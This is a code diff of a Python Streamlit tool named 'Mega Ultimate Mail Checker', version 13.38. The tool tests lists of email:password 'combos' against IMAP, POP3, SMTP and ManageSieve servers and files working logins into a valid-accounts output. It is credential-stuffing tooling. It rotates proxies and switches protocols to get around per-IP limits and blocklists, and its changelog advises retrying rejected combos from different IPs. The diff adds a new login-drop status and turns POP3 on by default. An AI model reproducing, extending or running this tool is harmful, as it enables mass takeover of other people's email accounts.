@@ -1,9 +1,69 @@
 """
-Mega Ultimate Mail Checker — v13.37
+Mega Ultimate Mail Checker — v13.38
 ===================================
 Complete rewrite. SMTP reachability is an OPT-IN pre-check stage (never inside
 the validator), status classification actually works, and every direct-connection
 line carries the real egress IP / region / country / VPN state.
+
+v13.38 changes  (THE * BYE THAT HAD NOWHERE TO LAND, AND THE PHASES THAT ATE
+                 EACH OTHER'S WINDOW)
+---------------------------------------------------------------------------
+THE BUG.  A live run against Windstream returned, on EVERY account, on EVERY
+node, and on the direct GCP egress:
+
+    -> AUTH IMAP imap.windstream.net:993: command: LOGIN => IMAP server
+       terminating connection [Classified: unknown]
+
+That string is CPython imaplib._command_complete() wrapping an abort raised from
+_get_tagged_response() when the server sends an untagged "* BYE" during LOGIN.
+Windstream's server takes the socket, reads the credentials and then closes.
+
+The app knew this.  It even had a bespoke sentence for it.  But there was no
+STATUS to put it in:
+
+  * status.py had no token matching "terminating connection" / "bye", so
+    classify_error() returned UNKNOWN.
+  * note_verdict() started with `if st_val not in (VALID, WRONG, APP, RBL)`,
+    so UNKNOWN was silently DISCARDED.
+  * the account therefore fell through every branch of the verdict block and
+    landed on the last resort: CONNECTION_FAILED - "we never reached the
+    server" - when the server had spoken and read the password.
+
+Net effect: a server-side drop and a real timeout were INDISTINGUISHABLE, and
+the unknown_results bucket was unreachable dead code.
+
+FIX (this file + status.py v13.32):
+
+  * P1  LOGIN_DROPPED is now a first-class status, classified by status.py
+        BEFORE _CONN_STRONG (which already owned "connection closed").
+  * P2  note_verdict() RETAINS LOGIN_DROPPED.
+  * P3  the imaplib/poplib handler and the generic handler both set
+        flags["saw_login_drop"] and log the drop explicitly.
+  * P4  the local-part retry now fires on LOGIN_DROPPED as well as WRONG/UNKNOWN.
+  * P5  LOGIN_DROPPED does NOT return early - so the POP3 rung, the other hosts
+        and the fallback ladder still get their turn.  A clean NO on POP3
+        outranks it (PRIORITY 2 vs 4) and wins; a second BYE returns it.
+  * P6  the verdict tail has an explicit LOGIN_DROPPED branch, and the retained
+        verdict carries a readout that says what actually happened.
+  * P7  a "Login Dropped" bucket exists end to end: live stream, metrics,
+        inspector, report, export files, ZIP.
+
+  * P8  PHASE DEADLINES ARE NOW REAL.  per_to had a hard 6.0s floor and
+        attempt_to a hard 5.0s floor, both of which IGNORED the phase deadline -
+        which is how "direct | pass 1: no window left (-8.4s)" happened and how
+        the proxy phase ate the direct phase's entire window.
+  * P9  143/110 rungs get a shorter leash (LEGACY_RUNG_TIMEOUT).  They are
+        routinely firewalled from cloud egress and were burning 2 x 15s per
+        account on a 142s window.
+  * P10 POP3 IS NOW A DEFAULT PROTOCOL.  pop.windstream.net was being RESOLVED
+        and then thrown away because the protocol picker defaulted to IMAP only -
+        while the app's own advice said "try the other protocol/host".  POP3 is
+        the only independent path when IMAP sends * BYE.
+  * P11 RerunException/StopException (BaseException, not Exception) are no
+        longer mislabelled as a generic failure.
+  * P12 the "Host expansion: N/M candidate(s) kept" line is emitted AFTER the
+        web-only drop, and the surviving ladder is logged, so it stops reading
+        as if 3 hosts will be tried when only 1 reaches the ladder.
 
 v13.37 changes  (THE 407 THAT WAS STILL FILED AS A TRANSPORT FAILURE, AND THE
                  POOL THAT EMPTIED ITSELF)
@@ -360,10 +420,7 @@ v13.32 changes  (THE IMAP CRASH, THE DOUBLE BASE64, THE 407 FLOOD, THE HANG)
 v13.31 changes  (protocol picker, SMTP AUTH, SASL PLAIN, honest Gmail labels)
 ---------------------------------------------------------------------------
 * NEW "PICK PROTOCOLS MODE" SIDEBAR SETTING.  A multi-select of
-  IMAP / POP3 / SMTP / ManageSieve.  DEFAULT IS IMAP ONLY, so nothing else is
-  dialled until you tick it - the app will not quietly burn budget on POP or
-  SMTP rungs you did not ask for.  The ladder, the budget floor and the AUTO
-  probe target all follow the selection.
+  IMAP / POP3 / SMTP / ManageSieve.  v13.38: DEFAULT IS NOW IMAP + POP3.
 * SMTP AUTH IS NOW A REAL PROTOCOL RUNG (confirm-only).  AUTH PLAIN, falling
   back to AUTH LOGIN, on 587 -> 465 -> 25.
 * MANAGESIEVE (4190) IS NOW A PROTOCOL RUNG (confirm-only).  STARTTLS +
@@ -638,6 +695,8 @@ try:
         FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
         SKIP, SKIPPED_COOLDOWN, UNKNOWN,
         RETRY, RETRY_LATER, RBL, RBL_BLOCKED, SMTP_FAILED, DNS_FAILED,
+        # FIX v13.38: the new server-side * BYE status
+        LOGIN_DROPPED,
         ALL_STATUSES as ST_ALL, LABELS as ST_LABELS, COLORS as ST_COLORS,
         PRIORITY as ST_PRIORITY,
         classify_error as st_classify, is_proxy_level_error as st_proxy_level,
@@ -660,12 +719,16 @@ except Exception as _status_err:
     RBL = RBL_BLOCKED = "rbl_blocked"
     SMTP_FAILED = "smtp_failed"
     DNS_FAILED = "dns_failed"
-    ST_ALL = [VALID, WRONG_PASSWORD, NEED_APP_PASSWORD, RETRY_LATER, RBL_BLOCKED,
-              SMTP_FAILED, DNS_FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
+    # FIX v13.38: the inline fallback must also know the new status, or an
+    # old status.py (or a failed import) silently reintroduces the bug.
+    LOGIN_DROPPED = "login_dropped"
+    ST_ALL = [VALID, WRONG_PASSWORD, NEED_APP_PASSWORD, LOGIN_DROPPED, RETRY_LATER,
+              RBL_BLOCKED, SMTP_FAILED, DNS_FAILED, CONNECTION_FAILED, PROXY_UNHEALTHY,
               UNKNOWN, SKIPPED_COOLDOWN]
     ST_LABELS = {s: s.upper() for s in ST_ALL}
     ST_COLORS = {
-        VALID: "#22c55e", WRONG_PASSWORD: "#ef4444", CONNECTION_FAILED: "#eab308",
+        VALID: "#22c55e", WRONG_PASSWORD: "#ef4444", LOGIN_DROPPED: "#f43f5e",
+        CONNECTION_FAILED: "#eab308",
         PROXY_UNHEALTHY: "#e879f9",
         NEED_APP_PASSWORD: "#3b82f6", RETRY_LATER: "#ffffff", RBL_BLOCKED: "#facc15",
         SMTP_FAILED: "#a855f7", DNS_FAILED: "#f97316", UNKNOWN: "#94a3b8",
@@ -673,8 +736,9 @@ except Exception as _status_err:
     }
     ST_PRIORITY = {
         VALID: 0, NEED_APP_PASSWORD: 1, WRONG_PASSWORD: 2, RBL_BLOCKED: 3,
-        RETRY_LATER: 4, SMTP_FAILED: 5, DNS_FAILED: 6, CONNECTION_FAILED: 7,
-        PROXY_UNHEALTHY: 8, UNKNOWN: 9, SKIPPED_COOLDOWN: 10,
+        LOGIN_DROPPED: 4,
+        RETRY_LATER: 5, SMTP_FAILED: 6, DNS_FAILED: 7, CONNECTION_FAILED: 8,
+        PROXY_UNHEALTHY: 9, UNKNOWN: 10, SKIPPED_COOLDOWN: 11,
     }
 
     _FB_APP = ("app password", "application-specific", "basic authentication is disabled",
@@ -683,6 +747,14 @@ except Exception as _status_err:
     _FB_RBL = ("rbl restriction", "rbl", "abusix", "dnsbl", "spamhaus",
                "blacklist", "blacklisted", "ip blocked")
     _FB_DNS = ("does not resolve", "name or service not known", "gaierror", "getaddrinfo")
+    # FIX v13.38: must run BEFORE _FB_CONN_STRONG, which owns "connection closed".
+    _FB_SERVER_DROP = ("terminating connection", "imap server terminating",
+                       "server terminating", "* bye", " bye ", "bye ",
+                       "auth process broken", "connection is closed",
+                       "server closed the connection", "server dropped the connection")
+    # FIX v13.38: must run BEFORE _FB_SERVER_DROP.
+    _FB_RETRY_HARD = ("too many", "limit", "quota", "busy", "throttle",
+                      "rate limit", "try again", "temporarily unavailable")
     _FB_CONN_STRONG = ("connection reset", "connection refused", "connection aborted",
                        "connection closed", "broken pipe", "unexpected eof", "eof",
                        "socket error", "socket closed", "timed out", "timeout",
@@ -712,9 +784,13 @@ except Exception as _status_err:
         t = (raw or "").lower()
         if t.strip().rstrip(".:!,;").strip() in _FB_BARE:
             return WRONG_PASSWORD
+        # FIX v13.38: RETRY_HARD -> SERVER_DROP -> CONN_STRONG (order matters)
         for table, val in ((_FB_APP, NEED_APP_PASSWORD), (_FB_RBL, RBL_BLOCKED),
                            (_FB_WRONG_STRONG, WRONG_PASSWORD),
-                           (_FB_DNS, DNS_FAILED), (_FB_CONN_STRONG, CONNECTION_FAILED),
+                           (_FB_DNS, DNS_FAILED),
+                           (_FB_RETRY_HARD, RETRY_LATER),
+                           (_FB_SERVER_DROP, LOGIN_DROPPED),
+                           (_FB_CONN_STRONG, CONNECTION_FAILED),
                            (_FB_RETRY, RETRY_LATER),
                            (_FB_CONN, CONNECTION_FAILED), (_FB_WRONG, WRONG_PASSWORD)):
             if any(n in t for n in table):
@@ -785,7 +861,7 @@ str_lit.set_page_config(
 # ============================================================================
 
 # Bump this whenever a DEFAULT changes in a way users should inherit.
-CFG_VERSION = 1337
+CFG_VERSION = 1338          # FIX v13.38: was 1337
 
 # ---- timing / response ----
 PROBE_TIMEOUT_DEFAULT = 8.0
@@ -817,6 +893,11 @@ FAILURE_COOLDOWN_DEFAULT = 45.0
 WORKER_FUTURE_PAD = 60
 GEO_CACHE_TTL = 600
 PROBE_RESULT_TTL = 120
+# FIX v13.38: 143/110 are frequently firewalled from cloud egress (GCP included)
+# and used to consume the full attempt timeout.  Give the legacy rungs a shorter
+# leash so they cannot eat the phase window.
+LEGACY_RUNG_TIMEOUT = 8.0
+LEGACY_PORTS = (143, 110)
 # v13.37: ip-api's free tier allows 45 requests/minute.  Space calls out and
 # remember failures separately from successes.
 GEO_FAIL_TTL = 300.0
@@ -836,7 +917,10 @@ PROTOCOL_POP = "POP3"
 PROTOCOL_SMTP = "SMTP"
 PROTOCOL_SIEVE = "ManageSieve"
 PROTOCOL_OPTIONS = [PROTOCOL_IMAP, PROTOCOL_POP, PROTOCOL_SMTP, PROTOCOL_SIEVE]
-PROTOCOL_SELECTION_DEFAULT = [PROTOCOL_IMAP]
+# FIX v13.38: POP3 is now ON by default.  pop.<domain> was being RESOLVED and
+# then thrown away, while the app's own advice said "try the other protocol".
+# POP3 is the only independent path when a legacy IMAP front sends * BYE.
+PROTOCOL_SELECTION_DEFAULT = [PROTOCOL_IMAP, PROTOCOL_POP]
 
 # internal rung codes
 RUNG_IMAP = "IMAP"
@@ -1195,6 +1279,18 @@ def _wrong_detail_note(domain, password) -> str:
         return " (may be correct - provider needs an APP PASSWORD for IMAP/POP/SMTP)"
     return ""
 
+def _login_dropped_detail() -> str:
+    """FIX v13.38: the honest readout for a server that answers then hangs up.
+
+    Deliberately NOT called 'wrong password': a * BYE after LOGIN is what a
+    CommuniGate-style front sends for a rejected credential AND for a per-IP /
+    per-account connection cap AND for a policy refusal (app password required).
+    The account is UNTESTED either way, and saying so is the whole point.
+    """
+    return ("server accepted LOGIN then closed the socket (* BYE) on every attempt "
+            "- usually a rejected password or an app-password requirement; retry from "
+            "a different IP or with an app password before discarding the combo")
+
 # ============================================================================
 # PERSISTENT ENGINE STATE  (v13.21 — survives every Streamlit rerun)
 # ============================================================================
@@ -1529,7 +1625,6 @@ def _imap_caps_selftest():
         except Exception as e:
             lines.append(f"  FAIL {label:46} -> {type(e).__name__}: {e}")
     try:
-        bad = b" ".join(("IMAP4REV1",))     # the v13.31 expression
         lines.append("  repro: b' '.join(str tuple) raises "
                      f"{type(_e_for(lambda: b' '.join(('IMAP4REV1',)))).__name__}")
     except Exception:
@@ -1645,7 +1740,7 @@ def build_diagnostics_text():
         L.append(str(s))
 
     A("=" * 78)
-    A("MEGA ULTIMATE MAIL CHECKER — v13.37 DIAGNOSTIC BUNDLE")
+    A("MEGA ULTIMATE MAIL CHECKER — v13.38 DIAGNOSTIC BUNDLE")
     A(f"generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     A("=" * 78)
 
@@ -1663,7 +1758,6 @@ def build_diagnostics_text():
     for k, v in _env_info().items():
         A(f"  {k:16}: {v}")
     try:
-        _cap = getattr(imaplib.IMAP4, "capabilities", None)
         A("  imaplib caps   : _get_capabilities() decodes with str(dat[-1], enc) "
           "=> mail.capabilities is a tuple of STR on CPython 3.x")
         A("  v13.31 bug     : b' '.join(str tuple) -> 'sequence item 0: expected a bytes-like object, str found'")
@@ -1674,6 +1768,28 @@ def build_diagnostics_text():
     A("--- 1b. _imap_caps() REGRESSION SELF-TEST (v13.32) ---")
     for line in _imap_caps_selftest():
         A(line)
+
+    A("")
+    A("--- 1c. * BYE CLASSIFIER SELF-TEST (v13.38) ---")
+    # FIX v13.38: prove the new rule fires, and that it does NOT swallow a
+    # genuine "too many connections" or a real transport error.
+    for _raw, _want in (
+        ("command: LOGIN => IMAP server terminating connection", LOGIN_DROPPED),
+        ("* BYE Connection is closed", LOGIN_DROPPED),
+        ("* BYE Auth process broken", LOGIN_DROPPED),
+        ("* BYE Too many simultaneous connections", RETRY_LATER),
+        ("* BYE Too many invalid IMAP commands", RETRY_LATER),
+        ("socket error: timed out", CONNECTION_FAILED),
+        ("connection reset by peer", CONNECTION_FAILED),
+        ("NO [AUTHENTICATIONFAILED] Invalid credentials", WRONG_PASSWORD),
+        ("Socket error: 407: Proxy Authentication Required", CONNECTION_FAILED),
+    ):
+        try:
+            _got = st_classify(_raw)
+        except Exception as _ce:
+            _got = f"<{_ce}>"
+        A(f"  {'OK  ' if _got == _want else 'FAIL'} {_raw[:52]:54} -> {_got}"
+          f"{'' if _got == _want else f'  (wanted {_want})'}")
 
     A("")
     A("--- 2. ACTIVE CONFIG (CFG) ---")
@@ -1768,6 +1884,7 @@ def build_diagnostics_text():
     A(f"  DIRECT_FIRST        : {CFG.get('DIRECT_FIRST')}")
     A(f"  RANDOM_ROTATION     : {CFG.get('RANDOM_ROTATION')}")
     A(f"  CONNECT_FLOOR/READ  : {CONNECT_FLOOR_DEFAULT} / {READ_FLOOR_DEFAULT}")
+    A(f"  LEGACY RUNG LEASH   : {LEGACY_RUNG_TIMEOUT}s on ports {LEGACY_PORTS}   <-- v13.38")
     A(f"  407 CONTRACT        : quarantine={PROXY_407_QUARANTINE} "
       f"force_direct={PROXY_407_FORCE_DIRECT} cooldown={PROXY_407_COOLDOWN:.0f}s "
       f"same_host_retries={CFG.get('SAME_HOST_RETRIES')}")
@@ -1883,8 +2000,8 @@ def default_theme() -> dict:
         "bg": p["bg"], "panel": p["panel"], "text": p["text"],
         "radius": 14, "glow": True, "animate": True, "glass": True,
         "colorize_logs": True,
-        "hero_title": "⚡ Mega Ultimate Mail Checker v13.37",
-        "hero_sub": "Plug-and-play edition — click 📥 Fetch & Test All Proxies, then press Start. v13.37 closes the last hole in the 407 path: a 407 that arrives on the non-preferred proxy scheme is now filed as a 407 (it used to be filed as a transport failure, so no strike, no park, no storm breaker). It also stops try_ms_xoauth2 swallowing the 407, stops the pool filter silently falling back to the raw list, and merges clean_valid_accounts.txt instead of overwriting it.",
+        "hero_title": "⚡ Mega Ultimate Mail Checker v13.38",
+        "hero_sub": "Plug-and-play edition — click 📥 Fetch & Test All Proxies, then press Start. v13.38 closes the last hole in the verdict path: a server that ANSWERS, ACCEPTS the LOGIN and then closes the socket (* BYE) was classified UNKNOWN, dropped by note_verdict() and reported as CONNECTION_FAILED — i.e. 'we never reached the server'. It is now its own status (LOGIN_DROPPED) with its own bucket. v13.38 also makes the phase deadlines real (no more 'no window left (-8.4s)'), gives the 143/110 rungs a shorter leash, and turns POP3 on by default so a legacy IMAP front that BYEs has somewhere to fall back to.",
     }
 
 def load_theme() -> dict:
@@ -2083,6 +2200,7 @@ def render_hero(th: dict):
                 <span class="bb-tag">Per-Sub-User 407 Gate</span>
                 <span class="bb-tag">Request Frugal</span>
                 <span class="bb-tag">Mail-Dest Spot Check</span>
+                <span class="bb-tag">Login-Dropped Bucket</span>
                 <span class="bb-tag">Microsoft XOAUTH2</span>
                 <span class="bb-tag">Deep Diagnostics</span>
             </div>
@@ -2105,6 +2223,7 @@ def section_title(icon: str, title: str, subtitle: str = ""):
 TAG_COLORS = {
     "VALID": "#22c55e",
     "WRONG_PASSWORD": "#ef4444",
+    "LOGIN_DROPPED": "#f43f5e",          # FIX v13.38
     "CONNECTION_FAILED": "#eab308",
     "PROXY_UNHEALTHY": "#e879f9",
     "NEED_APP_PASSWORD": "#3b82f6",
@@ -2122,16 +2241,19 @@ TAG_COLORS = {
 
 def _line_color(line: str) -> str:
     up = str(line).upper()
+    # FIX v13.38: LOGIN_DROPPED must be matched before the generic tags.
     for tag in ("SKIPPED_COOLDOWN", "SKIPPED", "NEED_APP_PASSWORD", "RBL_BLOCKED",
                 "WRONG_PASSWORD", "PROXY_UNHEALTHY", "CONNECTION_FAILED", "RETRY_LATER",
-                "SMTP_FAILED", "DNS_FAILED", "UNCLASSIFIED", "VALID", "UNKNOWN",
-                "EXCEPTION", "ERROR"):
+                "SMTP_FAILED", "DNS_FAILED", "UNCLASSIFIED", "LOGIN_DROPPED", "VALID",
+                "UNKNOWN", "EXCEPTION", "ERROR"):
         if f"[{tag}]" in up:
             return TAG_COLORS.get(tag, "#cbd5e1")
     if "[CLASSIFIED: VALID]" in up:
         return TAG_COLORS["VALID"]
     if "[CLASSIFIED: WRONG_PASSWORD]" in up:
         return TAG_COLORS["WRONG_PASSWORD"]
+    if "[CLASSIFIED: LOGIN_DROPPED]" in up:
+        return TAG_COLORS["LOGIN_DROPPED"]
     if "[CLASSIFIED: NEED_APP_PASSWORD]" in up:
         return TAG_COLORS["NEED_APP_PASSWORD"]
     if "[CLASSIFIED: RBL_BLOCKED]" in up:
@@ -2282,10 +2404,11 @@ if "valid_results" not in str_lit.session_state:
     str_lit.session_state.valid_results = loaded_valid
     str_lit.session_state.clean_valid_count = len(loaded_valid)
     str_lit.session_state.run_valid_count = len(loaded_valid)
+# FIX v13.38: login_drop_results added to the per-run bucket set
 for _k in ("wrong_results", "need_app_results", "conn_results", "proxy_results",
-           "retry_results", "rbl_results", "smtp_results", "dns_results",
-           "skip_results", "unknown_results", "report_entries", "log_lines",
-           "startup_entries", "pre_dns_failed", "pre_smtp_failed"):
+           "login_drop_results", "retry_results", "rbl_results", "smtp_results",
+           "dns_results", "skip_results", "unknown_results", "report_entries",
+           "log_lines", "startup_entries", "pre_dns_failed", "pre_smtp_failed"):
     if _k not in str_lit.session_state:
         str_lit.session_state[_k] = []
 if "zip_bytes" not in str_lit.session_state:
@@ -2686,7 +2809,8 @@ if str_lit.session_state.pop("_bb_reset_pending", False):
 str_lit.sidebar.header("⚙ Engine Control Panel")
 str_lit.sidebar.caption(
     "Universal defaults are pre-set for ANY mix of combos (Gmail / O365 / Yahoo / "
-    "legacy ISP). IMAP is the only protocol dialled until you add more below."
+    "legacy ISP). v13.38 dials IMAP + POP3 by default, so a legacy IMAP front that "
+    "sends '* BYE' has a second, independent protocol to fall back to."
 )
 str_lit.sidebar.caption(
     "ℹ️ Seeing **`TypeError: Importing a module script failed.`** in red? That is the "
@@ -2709,14 +2833,15 @@ protocol_pick = str_lit.sidebar.multiselect(
     options=PROTOCOL_OPTIONS,
     default=PROTOCOL_SELECTION_DEFAULT,
     key="ui_protocols",
-    help="Which protocols the engine is allowed to DIAL. DEFAULT IS IMAP ONLY - nothing else is "
-         "tried until you tick it.\n\n"
+    help="Which protocols the engine is allowed to DIAL. v13.38 DEFAULT IS IMAP + POP3 - POP3 is "
+         "the only independent path when a legacy IMAP front answers LOGIN with '* BYE' and hangs up.\n\n"
          "IMAP - 993 (TLS) / 143 (STARTTLS / plain). The default and the one that matters most.\n"
-         "POP3 - 995 (TLS) / 110 (STLS / plain). Add it when a provider has IMAP closed.\n"
+         "POP3 - 995 (TLS) / 110 (STLS / plain). A completely separate code path: different port, "
+         "different daemon, different IP-reputation bucket. Add it when a provider has IMAP closed "
+         "or misbehaving.\n"
          "SMTP - submission AUTH on 587 -> 465 -> 25. CONFIRM-ONLY: a success may make an account "
          "VALID, but a failure can never turn a good verdict bad (530 Authentication Required, relay "
-         "restrictions and 4xx say nothing about the password). Useful because it is a different "
-         "service on a different port, so it hits a different IP-reputation bucket.\n"
+         "restrictions and 4xx say nothing about the password).\n"
          "ManageSieve - 4190. CONFIRM-ONLY, same credentials, sometimes open when IMAP is not."
 )
 if not protocol_pick:
@@ -2770,7 +2895,8 @@ try_alt_username_ui = str_lit.sidebar.toggle(
     "Try local-part username on auth failure", value=True, key="ui_alt_user",
     help="Many legacy ISP servers (Zimbra / cPanel / Dovecot) expect 'user' rather than 'user@domain'. "
          "On an auth rejection the engine rotates to a FRESH node and retries the same host with the local part. "
-         "Not applied to SMTP, where the username must be the full address."
+         "v13.38: this also fires on a LOGIN_DROPPED (* BYE), not just WRONG. Not applied to SMTP, where the "
+         "username must be the full address."
 )
 
 smtp_precheck_ui = str_lit.sidebar.checkbox(
@@ -3299,7 +3425,9 @@ debug_mode = instant_help("debug_mode", "Stream verbose logs and error tracing d
 
 try_starttls_ui = str_lit.sidebar.toggle(
     "Enable STARTTLS + plaintext fallback (143 / 110)", value=True, key="ui_starttls",
-    help="If implicit TLS on 993/995 fails, retry the host over STARTTLS, then over plaintext."
+    help="If implicit TLS on 993/995 fails, retry the host over STARTTLS, then over plaintext. "
+         "v13.38: these rungs get a shorter leash (LEGACY_RUNG_TIMEOUT) because 143/110 are often "
+         "firewalled from cloud egress and used to eat the whole phase window."
 )
 
 resolved_proxy_mode = str_lit.sidebar.selectbox(
@@ -3400,7 +3528,7 @@ with _btn_c1:
     _apply_clicked = str_lit.button("💾 Apply Settings", type="primary", use_container_width=True)
 with _btn_c2:
     _reset_clicked = str_lit.button("♻️ Reset Defaults", use_container_width=True,
-                                    help="Restore every setting to the universal default (protocols back to IMAP-only).")
+                                    help="Restore every setting to the universal default (protocols back to IMAP + POP3).")
 
 if _reset_clicked:
     # v13.35: only raise a flag - the reset itself runs at the TOP of the script,
@@ -5213,7 +5341,7 @@ with str_lit.sidebar:
     str_lit.caption(
         f"407 contract: quarantine after **{PROXY_407_QUARANTINE}** strikes · "
         f"force DIRECT after **{PROXY_407_FORCE_DIRECT}** in a rung · park **{PROXY_407_COOLDOWN:.0f}s** · "
-        f"same-host retries **{CFG.get('SAME_HOST_RETRIES')}**"
+        f"same-host retries **{CFG.get('SAME_HOST_RETRIES')}** · legacy 143/110 leash **{LEGACY_RUNG_TIMEOUT:.0f}s**"
     )
 
     if _q_now:
@@ -5224,7 +5352,8 @@ with str_lit.sidebar:
         str_lit.warning("⚠ No node passed the tunnel probe. Press 📥 Fetch & Test All Proxies again.")
     else:
         str_lit.caption("A 407 means the PROXY rejected your credentials — usually a per-sub-user cap, "
-                        "not a dead node. A socket reset is reported separately.")
+                        "not a dead node. A socket reset is reported separately. A LOGIN_DROPPED (* BYE) "
+                        "is a MAIL-SERVER event, not a proxy one.")
 
     _rc1, _rc2 = str_lit.columns(2)
     with _rc1:
@@ -5366,6 +5495,17 @@ with str_lit.sidebar:
                     _probe_target_reachability(force=True)
                     _lines = [f"self-test {datetime.now().strftime('%H:%M:%S')}"]
                     _lines.extend(_imap_caps_selftest())
+                    for _raw, _want in (
+                        ("command: LOGIN => IMAP server terminating connection", LOGIN_DROPPED),
+                        ("* BYE Too many simultaneous connections", RETRY_LATER),
+                        ("timed out", CONNECTION_FAILED),
+                    ):
+                        try:
+                            _got = st_classify(_raw)
+                        except Exception as _ce:
+                            _got = f"<{_ce}>"
+                        _lines.append(f"  classify {_raw[:46]:48} -> {_got} "
+                                      f"{'OK' if _got == _want else 'WANTED ' + _want}")
                     for r in _probe_target_reachability(force=True):
                         _lines.append(f"  direct {r['target']}: {'OK' if r['ok'] else 'FAIL'} "
                                       f"{r['ms']}ms resolved={r.get('resolved')} {r['err']}")
@@ -5710,6 +5850,7 @@ if raw_text:
         ("✅ Valid Found", "valid_results"),
         ("❌ Wrong Password Found", "wrong_results"),
         ("🔐 App Password / 2FA Found", "need_app_results"),
+        ("🚪 Login Dropped (* BYE) Found", "login_drop_results"),   # FIX v13.38
         ("🕓 RETRY_LATER Found", "retry_results"),
         ("🚫 RBL Blocked Found", "rbl_results"),
         ("🔌 Connection Failed Found", "conn_results"),
@@ -6306,7 +6447,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
     dns_ok = True
 
     best_verdict = {"status": None, "detail": "", "host": ""}
-    flags = {"saw_407": False, "saw_nonproxy": False, "saw_server": False}
+    # FIX v13.38: saw_login_drop tracks a server that answered then hung up.
+    flags = {"saw_407": False, "saw_nonproxy": False, "saw_server": False,
+             "saw_login_drop": False}
     force_direct = {"flag": False}
     host_407 = {}
     net_failed_hosts = set()
@@ -6349,7 +6492,10 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         primary_user = users[0]
 
         def note_verdict(st_val, detail, host=""):
-            if st_val not in (VALID, WRONG, APP, RBL):
+            # FIX v13.38: LOGIN_DROPPED is a real server answer, not noise.
+            # Dropping it here is what made the account fall all the way through
+            # to the last-resort CONNECTION_FAILED branch.
+            if st_val not in (VALID, WRONG, APP, RBL, LOGIN_DROPPED):
                 return
             cur = best_verdict["status"]
             if cur is None or ST_PRIORITY.get(st_val, 99) < ST_PRIORITY.get(cur, 99):
@@ -6403,6 +6549,13 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         _web = [h for h in imap_hosts if h.lower() in WEB_ONLY_HOSTS]
         if _web and len(_web) < len(imap_hosts):
             imap_hosts = [h for h in imap_hosts if h.lower() not in WEB_ONLY_HOSTS] + _web
+
+        # FIX v13.38: log the ladder that ACTUALLY survives every drop, so the
+        # "3/6 candidate(s) kept" line stops reading as if 3 hosts will be
+        # dialled when only 1 reaches the ladder.
+        trace_logs.append(
+            f"IMAP ladder after web-only drop: {imap_hosts} "
+            f"(POP {pop_hosts} | SMTP {_smtp_hosts})")
 
         _local_roots = tuple(_domain_roots(domain))
 
@@ -6533,7 +6686,16 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             got_host = gate.acquire(timeout=max(2.0, attempt_to))
             try:
                 if deadline_ts is not None:
-                    attempt_to = max(5.0, min(attempt_to, deadline_ts - time.time()))
+                    # FIX v13.38: the old max(5.0, min(attempt_to, deadline - now))
+                    # floor IGNORED the phase deadline, so a phase could not stop
+                    # and overran into the next one - which is how
+                    # "direct | pass 1: no window left (-8.4s)" happened.
+                    _rem = deadline_ts - time.time()
+                    attempt_to = max(2.5, min(attempt_to, _rem)) if _rem > 1.0 else 2.0
+                # FIX v13.38: 143/110 are routinely firewalled from cloud egress
+                # and used to consume the whole attempt timeout.
+                if int(port) in LEGACY_PORTS:
+                    attempt_to = min(attempt_to, LEGACY_RUNG_TIMEOUT)
                 if px_used:
                     got_proxy = _proxy_gate().acquire(timeout=_gate_wait(attempt_to))
                     try:
@@ -6647,7 +6809,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 trace_logs.append(f"{label}: no window left ({left:.1f}s).")
                 return None, had_net, saw_retry
 
-            per_to = max(6.0, min(configured_to, left / max(1, len(rungs))))
+            # FIX v13.38: the old max(6.0, ...) floor ignored the phase deadline,
+            # so a phase could not shrink its own per-rung budget and overran.
+            per_to = max(3.0, min(configured_to, left / max(1, len(rungs))))
             trace_logs.append(f"--- {label}: {len(rungs)} rung(s), ~{per_to:.1f}s each, {left:.1f}s window ---")
 
             for rung_idx, (proto, server, port, tls_mode) in enumerate(rungs):
@@ -6675,7 +6839,11 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     if time.time() > deadline_ts:
                         break
 
-                    attempt_to = max(5.0, min(per_to, deadline_ts - time.time()))
+                    # FIX v13.38: real deadline enforcement inside the retry loop.
+                    _rem = deadline_ts - time.time()
+                    if _rem <= 1.0:
+                        break
+                    attempt_to = max(2.5, min(per_to, _rem))
 
                     trace_logs.append(f"{px_tag(px_used)} Attempting {proto} {tls_mode.upper()} -> Host: {server}:{port}")
                     server_level_fail = False
@@ -6825,6 +6993,16 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} {server}:{port}: {err_text[:140]} [Classified: {st_val}]")
                             note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
 
+                            # FIX v13.38: a * BYE arrives here as IMAP4.abort.
+                            # Flag it so the verdict block can report it, and so
+                            # the trace says what physically happened.
+                            if st_val == LOGIN_DROPPED:
+                                flags["saw_login_drop"] = True
+                                trace_logs.append(
+                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
+                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
+                                    f"password still untested; continuing the ladder")
+
                             if st_val == APP:
                                 xres = try_ms_xoauth2(server, px_used, attempt_to, err_text)
                                 if xres:
@@ -6850,7 +7028,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             elif st_val == RBL:
                                 trace_logs.append(f"{px_tag(px_used)} RBL block on {server}:{port} -> IP flagged by server, advancing")
                                 server_level_fail = True
-                            elif u_idx + 1 < len(users) and st_val in (WRONG, UNKNOWN):
+                            # FIX v13.38: LOGIN_DROPPED now gets the local-part
+                            # retry too, exactly like WRONG/UNKNOWN used to.
+                            elif u_idx + 1 < len(users) and st_val in (WRONG, UNKNOWN, LOGIN_DROPPED):
                                 flags["saw_server"] = True
                                 px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry", keep_node=True)
                                 trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
@@ -6866,6 +7046,15 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                     f"{px_tag(px_used)} WRONG on {'local' if server in domain_local_hosts else 'FOREIGN'} host {server} "
                                     f"-> noted ({best_verdict['status'] or 'none'} retained), continuing")
                                 server_level_fail = True
